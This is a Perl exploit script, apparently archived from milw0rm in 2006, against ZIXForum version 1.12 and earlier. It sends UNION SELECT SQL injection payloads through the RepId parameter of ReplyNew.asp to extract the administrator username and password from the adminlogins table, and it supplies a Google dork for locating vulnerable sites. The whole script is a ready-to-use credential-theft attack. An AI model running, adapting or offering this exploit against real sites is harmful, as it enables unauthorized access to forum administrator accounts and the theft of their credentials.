#!/usr/bin/perl
###########################################
# ZIXForum <= v1.12 Exploit
# Vulnerability found by Chironex Fleckeri
# Created By: SlimTim10
# <slimtim10@gmail.com>
###########################################
# Google dork:
# intext:"ZIXForum 1.12 by: ZixCom 2002"
###########################################


use IO::Socket::INET;

usage() unless (@ARGV == 2);

$host = shift(@ARGV);
$dir = shift(@ARGV);

$dir = "\/$dir" if ($dir !~ /^\//);
$dir = "$dir\/" if ($dir !~ /\/$/);
$host =~ s/http:\/\///g;

$path = $dir.'ReplyNew.asp?RepId=-1%20UNION%20SELECT%20null,null,null,J_user,null,null,null,null,null,null,null,null%20FROM%20adminlogins';
$path2 = $dir.'ReplyNew.asp?RepId=-1%20UNION%20SELECT%20null,null,null,J_pass,null,null,null,null,null,null,null,null%20FROM%20adminlogins';
$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-]Connect Failed: could not connect to $host\r\n"; # show an error!

print "[+]Connecting...\n";
print $socket "GET $path HTTP/1.1\n";
print $socket "Host: $host\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "[+]Connected\n";
print "[+]User: ";

while ($answer = <$socket>) {
    $answer =~ m/name="R_Headline" size="30" class="normal" value="Re: (.*?)"/ && print "$1\n";
}

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-]Connect Failed: could not connect to $host\r\n";
print $socket "GET $path2 HTTP/1.1\n";
print $socket "Host: $host\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "[+]Pass: ";

while ($answer = <$socket>) {
    $answer =~ m/name="R_Headline" size="30" class="normal" value="Re: (.*?)"/ && print "$1\n";
}

sub usage {
    print "\n" . "=|=-" x 14 . "=|=";
    print q(
]                                                         [
[  ZIXForum <= 1.12 "RepId" Remote SQL Injection Exploit  ]
]               Tested on ZIXForum <= v1.12               [
[       Created By: SlimTim10 <slimtim10@gmail.com>       ]
]                                                         [);
    print "\n" . "=|=-" x 14 . "=|=\n\n";
    print " Usage: $0";
    print q( [HOST] [PATH] E.g. );
    print "$0";
    print q(  www.host.com /forum/);
    print "\n\n" . "`^" x 29 . "`\n";
    exit;
}

# milw0rm.com [2006-09-17]
